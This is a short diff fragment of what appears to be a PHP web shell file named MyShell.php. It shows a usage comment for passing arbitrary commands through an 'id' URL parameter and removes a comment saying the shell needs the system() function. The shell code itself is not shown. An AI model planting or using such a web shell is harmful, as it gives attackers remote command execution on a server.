@@ -11,4 +11,3 @@
 ?>
 </html>
 <!--http://.../MyShell.php?id=[your_command]-->
-<!--This shell can only use turn on the system() function-->
